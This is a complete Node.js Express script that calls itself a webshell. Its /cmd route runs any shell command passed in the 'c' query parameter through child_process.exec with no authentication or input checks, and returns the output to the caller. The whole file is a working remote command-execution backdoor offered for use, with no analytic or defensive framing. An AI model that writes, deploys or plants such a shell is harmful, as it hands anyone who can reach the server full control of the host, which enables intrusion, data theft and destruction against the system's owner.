const express = require("express");
const { exec } = require("child_process");

const app = express();
const PORT = process.env.PORT || 3000;

// route: /cmd?c=ls
app.get("/cmd", (req, res) => {
  const cmd = req.query.c;
  if (!cmd) return res.send("No command provided!");

  exec(cmd, { timeout: 5000 }, (err, stdout, stderr) => {
    if (err) return res.send("Error: " + err.message);
    if (stderr) return res.send("Stderr: " + stderr);
    res.send("Output:\n" + stdout);
  });
});

app.listen(PORT, () => {
  console.log(`Webshell running on port ${PORT}`);
});
